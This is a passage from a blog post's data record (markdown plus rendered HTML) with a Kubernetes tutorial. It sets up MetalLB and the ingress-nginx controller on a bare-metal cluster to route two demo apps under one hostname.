deploy the ingress controller with the following command:\n``` bash command line prompt \nraf²@4n6nk8s-master$ helm upgrade --install ingress-nginx ingress-nginx \\\n  --repo https://kubernetes.github.io/ingress-nginx \\\n  --namespace ingress-nginx --create-namespace\n```\n## Install the controller using yaml manifest:\nIf you don't have Helm or if you prefer to use a YAML manifest, you can run the following command instead:\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.2.0/deploy/static/provider/cloud/deploy.yaml\n\nnamespace/ingress-nginx created\nserviceaccount/ingress-nginx created\nserviceaccount/ingress-nginx-admission created\nrole.rbac.authorization.k8s.io/ingress-nginx created\nrole.rbac.authorization.k8s.io/ingress-nginx-admission created\nclusterrole.rbac.authorization.k8s.io/ingress-nginx created\nclusterrole.rbac.authorization.k8s.io/ingress-nginx-admission created\nrolebinding.rbac.authorization.k8s.io/ingress-nginx created\nrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created\nclusterrolebinding.rbac.authorization.k8s.io/ingress-nginx created\nclusterrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created\nconfigmap/ingress-nginx-controller created\nservice/ingress-nginx-controller created\nservice/ingress-nginx-controller-admission created\ndeployment.apps/ingress-nginx-controller created\njob.batch/ingress-nginx-admission-create created\njob.batch/ingress-nginx-admission-patch created\ningressclass.networking.k8s.io/nginx created\nvalidatingwebhookconfiguration.admissionregistration.k8s.io/ingress-nginx-admission created\n```\n## Check the Nginx Ingress Controller:\nLet's check the pods created in the namespace of the ingress-nginx\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get pods --namespace=ingress-nginx\n\nNAME                                        READY   STATUS              RESTARTS   AGE\ningress-nginx-admission-create-qd8fz        0/1     ContainerCreating   0          10s\ningress-nginx-admission-patch-76lgl         0/1     ContainerCreating   0          10s\ningress-nginx-controller-7575567f98-hg6tq   0/1     ContainerCreating   0          10s\n```\nAfter waiting a few minute until the controller is ready, we must check all the services and deployments of the ingress-nginx namespace again ! You must find an output similar to the following\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl get all -n ingress-nginx\n\nNAME                                            READY   STATUS      RESTARTS        AGE\npod/ingress-nginx-admission-create-9dshm        0/1     Completed   0               23m\npod/ingress-nginx-admission-patch-rj7gk         0/1     Completed   0               23m\npod/ingress-nginx-controller-7575567f98-8w6pm   1/1     Running     0               23m\n\nNAME                                         TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)                      AGE\nservice/ingress-nginx-controller             LoadBalancer   10.100.234.221   192.168.1.240   80:32545/TCP,443:31214/TCP   23m\nservice/ingress-nginx-controller-admission   ClusterIP      10.109.162.157   <none>          443/TCP                      23m\n\nNAME                                       READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/ingress-nginx-controller   1/1     1            1           23m\n\nNAME                                                  DESIRED   CURRENT   READY   AGE\nreplicaset.apps/ingress-nginx-controller-7575567f98   1         1         1       23m\n\nNAME                                       COMPLETIONS   DURATION   AGE\njob.batch/ingress-nginx-admission-create   1/1           3s         23m\njob.batch/ingress-nginx-admission-patch    1/1           4s         23m\n```\nBingo! the ingress controller is ready and on running state! also is exposed with Load Balancer and it have a Extenal-IP `192.168.1.240`\nNow we can deploy an ingress object without any problem ! It's time to deploy our 2 apps with ingress in one single domain name and one IP address !\n\n# Deploy The two Apps using Ingress:\nLet's start by deploying the apps and expose it with Cluster IP service !\n\n```yaml Gym App Deployment\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: 4n6nk8s-gym\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gym\n  template:\n    metadata:\n      labels:\n        app: gym\n    spec:\n      containers:\n      - name: gym-app\n        image: mohamedrafraf/k8s-gym\n        ports:\n        - containerPort: 80\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: gym-svc\nspec:\n  selector:\n    app: gym\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    port: 80\n```\nCreate the deployment and service of the gym app\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f gym-deployment.yaml\ndeployment.apps/4n6nk8s-gym created\nraf²@4n6nk8s-master$ kubectl apply -f gym-svc.yaml\nservice/gym-svc created\n```\nThe manifest of the restaurant app and the service:\n```yaml Restaurant App Deployment   \napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: 4n6nk8s-kitchen\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kitchen\n  template:\n    metadata:\n      labels:\n        app: kitchen\n    spec:\n      containers:\n      - name: kitchen-app\n        image: mohamedrafraf/k8s-kitchen\n        ports:\n        - containerPort: 80\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: kitchen-svc\nspec:\n  selector:\n    app: kitchen\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    port: 80\n```\nCreate the restaurant deployment and the service:\n``` bash command line prompt \nraf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml\ndeployment.apps/4n6nk8s-kitchen created\nraf²@4n6nk8s-master$ kubectl apply -f kitchen-svc.yaml\nservice/kitchen-svc created\n```\nCheck the deployments and the services! :\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl get all\nNAME                                   READY   STATUS    RESTARTS   AGE\npod/4n6nk8s-gym-698f44db99-29dnr       1/1     Running   0          63s\npod/4n6nk8s-kitchen-6b56959b86-n7c9z   1/1     Running   0          46s\n\nNAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE\nservice/gym-svc             ClusterIP   10.110.191.206   <none>        80/TCP     53s\nservice/kitchen-svc         ClusterIP   10.102.94.94     <none>        80/TCP     39s\nservice/kubernetes          ClusterIP   10.96.0.1        <none>        443/TCP    3d14h\n\nNAME                              READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/4n6nk8s-gym       1/1     1            1           63s\ndeployment.apps/4n6nk8s-kitchen   1/1     1            1           46s\n\nNAME                                         DESIRED   CURRENT   READY   AGE\nreplicaset.apps/4n6nk8s-gym-698f44db99       1         1         1       63s\nreplicaset.apps/4n6nk8s-kitchen-6b56959b86   1         1         1       46s\n```\nLet's now create the ingress manifest:\n```yaml Ingress YAML Definition\n\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.ingress.kubernetes.io/rewrite-target: /\n  name: ingress-4n6nk8s\nspec:\n  ingressClassName: nginx\n  rules:\n  - host: justk8s.k8s\n    http:\n      paths:\n      - path: /kitchen\n        pathType: Prefix\n        backend:\n          service:\n            name: kitchen-svc\n            port:\n              number: 80\n      - path: /gym\n        pathType: Prefix\n        backend:\n          service:\n            name: gym-svc\n            port:\n              number: 80\n```\nThe `ingressClassName` must be \"nginx\" since we have nginx ingress controller. The `host` field in the `rules` define the domain name of the request. So if a HTTP request come to the cluster with the host name `justk8s.k8s` this rull will be applied!\nThe the `path` int the `paths` will be the route ! The ingress give you the service in this route!\nIn our Example if we enter `http://justk8s.k8s/kitchen` the ingress will forward the restaurant app!\nin the `path` field we specify the `service` name and the `port number`\n\nNow Let's Create the ingress object\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl apply -f ingress.yaml\ningress.networking.k8s.io/ingress-4n6nk8s created\n```\nCheck the ingerss object ! \n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl get ingress\nNAME              CLASS   HOSTS         ADDRESS   PORTS   AGE\ningress-4n6nk8s   nginx   justk8s.k8s             80      5s\n``` \nDisplay more details about the ingress object with `kubectl describe ingress`:\n``` bash command line prompt\nraf²@4n6nk8s-master$ kubectl describe ingress ingress-4n6nk8s\nName:             ingress-4n6nk8s\nLabels:           <none>\nNamespace:        default\nAddress:          192.168.1.240\nDefault backend:  default-http-backend:80 (<error: endpoints \"default-http-backend\" not found>)\nRules:\n  Host         Path  Backends\n  ----         ----  --------\n  justk8s.k8s\n               /kitchen   kitchen-svc:80 (10.1.235.141:80)\n               /gym       gym-svc:80 (10.1.235.147:80)\nAnnotations:   nginx.ingress.kubernetes.io/rewrite-target: /\nEvents:\n  Type    Reason  Age               From                      Message\n  ----    ------  ----              ----                      -------\n  Normal  Sync    7s (x2 over 19s)  nginx-ingress-controller  Scheduled for sync\n```\nWe see that the Default backend display `(<error: endpoints \"default-http-backend\" not found>)`.\nThis error occur because we don't specify a default backend (route) so when you enter `http://justk8s.k8s/` we will find the nginx 404 not found page !\n# Check the Deployments! \nAfter Installing the LoadBalancer and Ingress Controller. Let's try to access to our 2 apps. But before access to this apps let's create an `/etc/hosts` entry (`C:\\Windows\\System32\\Drivers\\etc\\hosts` for Windows):\n```bash /etc/hosts \n192.168.1.240 justk8s.k8s # The IP address of the Load Balancer of the Ingress Controller !\n```\nNow Let's go to our browser! I add this entry in my master node! So I can access to these apps from my master node !:\n\n![](https://imgur.com/p4sAzQX.png)\n![](https://imgur.com/tauie6V.png)\n\nBingo! Everything is Ok !","slug":"Kubernetes/nginx-ingress","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxno000gd5qf52yccapx","content":"<h1 id=\"ingress-in-bare-metal-kubernetes-cluster\"><a class=\"markdownIt-Anchor\" href=\"#ingress-in-bare-metal-kubernetes-cluster\">#</a> Ingress in bare metal Kubernetes cluster</h1>\n<p>You are working in enterprise that have one cluster with one public IP address and one Domain Name. In our Example  <code>justk8s.k8s</code> .<br>\nThat Enterprise want to deploy two web apps for these new service (gym and restaurant) with that single cluster,IP and Domain Name !!<br>\nYour task is to deploy these two apps! So you decide to use  <code>Ingress</code>  because it’s the best solution for this kind of problems!</p>\n<h2 id=\"what-is-ingress\"><a class=\"markdownIt-Anchor\" href=\"#what-is-ingress\">#</a> What is Ingress</h2>\n<p>Kubernetes Ingress is an API object that provides routing rules to manage external users’ access to the services in a Kubernetes cluster, typically via HTTPS/HTTP. With Ingress, you can easily set up rules for routing traffic without creating a bunch of Load Balancers or exposing each service on the node<br>\n<img data-src=\"https://imgur.com/rXoZYym.png\" alt=\"\"></p>\n<h2 id=\"ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#ingress-controller\">#</a> Ingress Controller</h2>\n<p>An Ingress Controller is a Kubernetes controller that is deployed manually to the cluster, most often as a DaemonSet or a Deployment object that runs dedicated Pods for handling incoming traffic load balancing and smart routing. It is responsible for processing the Ingress objects (which specify that they especially want to use the Ingress Controller) and dynamically configuring real routing rules<br>\nThe most common used Ingress controllerfor Kubernetes is  <code>Ingress Nginx</code> <br>\n<img data-src=\"https://imgur.com/P0IubVc.png\" alt=\"\"></p>\n<h2 id=\"ingress-in-cloud-vs-ingress-in-bare-metal-cluster\"><a class=\"markdownIt-Anchor\" href=\"#ingress-in-cloud-vs-ingress-in-bare-metal-cluster\">#</a> Ingress in cloud Vs Ingress in bare metal cluster</h2>\n<p>Deploying Ingress pn managed Kubernetes cluster provided in cloud easier than in bare metal cluster. Because the Ingress Controller must be exposed as LoadBlancer!</p>\n<p>In traditional cloud environments, where network load balancers are available on-demand, a single Kubernetes manifest suffices to provide a single point of contact to the NGINX Ingress controller to external clients and, indirectly, to any application running inside the cluster.</p>\n<p><img data-src=\"https://imgur.com/JM86JeT.png\" alt=\"\"></p>\n<p>Bare-metal environments lack this commodity, requiring a slightly different setup to offer the same kind of access to external consumers. So we need an aproach to solve this problem !</p>\n<p><img data-src=\"https://imgur.com/MaTmKew.png\" alt=\"\"></p>\n<h1 id=\"create-load-balancer-proxy-for-bare-metal-cluster\"><a class=\"markdownIt-Anchor\" href=\"#create-load-balancer-proxy-for-bare-metal-cluster\">#</a> Create Load Balancer / Proxy for bare metal cluster</h1>\n<p>There is a lot of method to set up a Load Balancer or Proxy to get Ingress work on our cluster.</p>\n<ul>\n<li>We can expose our ingress controller using NodePort service and set up a proxy that forward to this service using a nginx proxy or HA proxy</li>\n<li>We can also install a software solution called  <code>metalLB</code> . This solution allows to create Load Balancer in local cluster without any problem ! So we can expose our ingress controller using Load Balancer service like in the cloud environment!</li>\n</ul>\n<h2 id=\"create-load-balancer-using-metallb\"><a class=\"markdownIt-Anchor\" href=\"#create-load-balancer-using-metallb\">#</a> Create Load Balancer using metalLB:</h2>\n<p>In this demo we will deploy one of the 2 apps and expose it with Load Balancer service for the test purposes. So Let’s start deploying the restaurant app and expose it !</p>\n<figure class=\"highlight yaml\"><figcaption><span>Restaurant App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-kitchen</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">kitchen-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the gym app deployment</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen created</span><br><span class=\"line\"></span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all</span><br><span class=\"line\">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">pod/4n6nk8s-kitchen-698f44db99-29dnr   1/1     Running   0          63s</span><br></pre></td></tr></table></figure>\n<p>Let’s now expose now the deployment:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl expose deploy/4n6nk8s-kitchen--type=LoadBalacner --port=80</span><br><span class=\"line\">service/4n6nk8s-kitchen created</span><br></pre></td></tr></table></figure>\n<p>Let’s check this service</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get svc</span><br><span class=\"line\">NAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE</span><br><span class=\"line\">4n6nk8s-kitchen   LoadBalancer   10.97.71.78      &lt;pending&gt;       80:30918/TCP   21s</span><br><span class=\"line\">kubernetes        ClusterIP      10.96.0.1        &lt;none&gt;          443/TCP        5d11h</span><br></pre></td></tr></table></figure>\n<p>As we see the LoadBalancer service still pending since we don’t have any Load Balancer! Now it’s time to talk about the metalLB !</p>\n<p>MetalLB provides a network load-balancer implementation for Kubernetes clusters that do not run on a supported cloud provider, effectively allowing the usage of LoadBalancer Services within any cluster.<br>\n<img data-src=\"https://imgur.com/Xv7PiiK.png\" alt=\"\"></p>\n<p>It’s time to install metalLB. Installing metalLB is so easy we just need to apply two manifest from the official site of <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXRhbGxiLnVuaXZlcnNlLnRmL2luc3RhbGxhdGlvbi8=\">metalLB</span></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/namespace.yaml</span><br><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/metallb.yaml</span><br></pre></td></tr></table></figure>\n<p>After running the previous commands, a new namespace will be created with a deployment, daesmonset and lot of RBAC authorization and rules!. So let’s check this namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all -n metallb-system</span><br><span class=\"line\">NAME                              READY   STATUS    RESTARTS       AGE</span><br><span class=\"line\">pod/controller-7cf77c64fb-4b8sx   1/1     Running   0              23s</span><br><span class=\"line\">pod/speaker-chh2t                 1/1     Running   0              23s</span><br><span class=\"line\">pod/speaker-xbn8z                 1/1     Running   0              23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                     DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE</span><br><span class=\"line\">daemonset.apps/speaker   2         2         2       2            2           kubernetes.io/os=linux   23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                         READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/controller   1/1     1            1           23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                    DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/controller-7cf77c64fb   1         1         1       23s</span><br></pre></td></tr></table></figure>\n<h2 id=\"configure-the-address-pool-of-the-load-balancer\"><a class=\"markdownIt-Anchor\" href=\"#configure-the-address-pool-of-the-load-balancer\">#</a> Configure the address pool of the Load Balancer</h2>\n<p>Now we must configure the  <code>metalLB</code>  using configmap object. In this configmap we give the address pool that will be used as LoadBalancer IP! Also the type of the Load Balancer.</p>\n<blockquote>\n<p>metalLB supports two LoadBalancing modes : Layer 2 mode and BGP mode. In our case we will use the Layer 2 mode</p>\n</blockquote>\n<p>Now Let’s move to the configmap manifest!</p>\n<figure class=\"highlight yaml\"><figcaption><span>Configmap</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ConfigMap</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">metallb-system</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">config</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">config:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">    address-pools:</span></span><br><span class=\"line\"><span class=\"string\">    - name: default</span></span><br><span class=\"line\"><span class=\"string\">      protocol: layer2</span></span><br><span class=\"line\"><span class=\"string\">      addresses:</span></span><br><span class=\"line\"><span class=\"string\">      - 192.168.1.240-192.168.1.250</span></span><br></pre></td></tr></table></figure>\n<p>After Applying this recent configmap. we can say that the metalLB installtion is finished! So Let’s check the services again in our cluster !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get svc</span><br><span class=\"line\">NAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE</span><br><span class=\"line\">4n6nk8s-kitchen   LoadBalancer   10.97.71.78      192.168.1.241   80:30918/TCP   5m4s</span><br><span class=\"line\">kubernetes        ClusterIP      10.96.0.1        &lt;none&gt;          443/TCP        5d11h</span><br></pre></td></tr></table></figure>\n<p>Bingo! our Load Balancer service has an external IP address. So our deployment is accessable through this IP! Let’s check it:<br>\nٍ<img data-src=\"https://imgur.com/jWkr5kf.png\" alt=\"\"><br>\nEverything is OK! now we can say that we have a Load Balancer on our bare metal cluster!</p>\n<h1 id=\"install-the-nginx-ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#install-the-nginx-ingress-controller\">#</a> Install the nginx Ingress Controller:</h1>\n<p>Installing the nginx ingress controller can be done either by using Helm or the yaml manifest provided in the nginx controller website</p>\n<h2 id=\"install-the-controller-using-helm\"><a class=\"markdownIt-Anchor\" href=\"#install-the-controller-using-helm\">#</a> Install the controller using Helm</h2>\n<p>If you have Helm, you can deploy the ingress controller with the following command:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ helm upgrade --install ingress-nginx ingress-nginx \\</span><br><span class=\"line\">  --repo https://kubernetes.github.io/ingress-nginx \\</span><br><span class=\"line\">  --namespace ingress-nginx --create-namespace</span><br></pre></td></tr></table></figure>\n<h2 id=\"install-the-controller-using-yaml-manifest\"><a class=\"markdownIt-Anchor\" href=\"#install-the-controller-using-yaml-manifest\">#</a> Install the controller using yaml manifest:</h2>\n<p>If you don’t have Helm or if you prefer to use a YAML manifest, you can run the following command instead:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.2.0/deploy/static/provider/cloud/deploy.yaml</span><br><span class=\"line\"></span><br><span class=\"line\">namespace/ingress-nginx created</span><br><span class=\"line\">serviceaccount/ingress-nginx created</span><br><span class=\"line\">serviceaccount/ingress-nginx-admission created</span><br><span class=\"line\">role.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">role.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">configmap/ingress-nginx-controller created</span><br><span class=\"line\">service/ingress-nginx-controller created</span><br><span class=\"line\">service/ingress-nginx-controller-admission created</span><br><span class=\"line\">deployment.apps/ingress-nginx-controller created</span><br><span class=\"line\">job.batch/ingress-nginx-admission-create created</span><br><span class=\"line\">job.batch/ingress-nginx-admission-patch created</span><br><span class=\"line\">ingressclass.networking.k8s.io/nginx created</span><br><span class=\"line\">validatingwebhookconfiguration.admissionregistration.k8s.io/ingress-nginx-admission created</span><br></pre></td></tr></table></figure>\n<h2 id=\"check-the-nginx-ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#check-the-nginx-ingress-controller\">#</a> Check the Nginx Ingress Controller:</h2>\n<p>Let’s check the pods created in the namespace of the ingress-nginx</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get pods --namespace=ingress-nginx</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                        READY   STATUS              RESTARTS   AGE</span><br><span class=\"line\">ingress-nginx-admission-create-qd8fz        0/1     ContainerCreating   0          10s</span><br><span class=\"line\">ingress-nginx-admission-patch-76lgl         0/1     ContainerCreating   0          10s</span><br><span class=\"line\">ingress-nginx-controller-7575567f98-hg6tq   0/1     ContainerCreating   0          10s</span><br></pre></td></tr></table></figure>\n<p>After waiting a few minute until the controller is ready, we must check all the services and deployments of the ingress-nginx namespace again ! You must find an output similar to the following</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all -n ingress-nginx</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                            READY   STATUS      RESTARTS        AGE</span><br><span class=\"line\">pod/ingress-nginx-admission-create-9dshm        0/1     Completed   0               23m</span><br><span class=\"line\">pod/ingress-nginx-admission-patch-rj7gk         0/1     Completed   0               23m</span><br><span class=\"line\">pod/ingress-nginx-controller-7575567f98-8w6pm   1/1     Running     0               23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                         TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)                      AGE</span><br><span class=\"line\">service/ingress-nginx-controller             LoadBalancer   10.100.234.221   192.168.1.240   80:32545/TCP,443:31214/TCP   23m</span><br><span class=\"line\">service/ingress-nginx-controller-admission   ClusterIP      10.109.162.157   &lt;none&gt;          443/TCP                      23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                       READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/ingress-nginx-controller   1/1     1            1           23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                                  DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/ingress-nginx-controller-7575567f98   1         1         1       23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                       COMPLETIONS   DURATION   AGE</span><br><span class=\"line\">job.batch/ingress-nginx-admission-create   1/1           3s         23m</span><br><span class=\"line\">job.batch/ingress-nginx-admission-patch    1/1           4s         23m</span><br></pre></td></tr></table></figure>\n<p>Bingo! the ingress controller is ready and on running state! also is exposed with Load Balancer and it have a Extenal-IP  <code>192.168.1.240</code> <br>\nNow we can deploy an ingress object without any problem ! It’s time to deploy our 2 apps with ingress in one single domain name and one IP address !</p>\n<h1 id=\"deploy-the-two-apps-using-ingress\"><a class=\"markdownIt-Anchor\" href=\"#deploy-the-two-apps-using-ingress\">#</a> Deploy The two Apps using Ingress:</h1>\n<p>Let’s start by deploying the apps and expose it with Cluster IP service !</p>\n<figure class=\"highlight yaml\"><figcaption><span>Gym App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 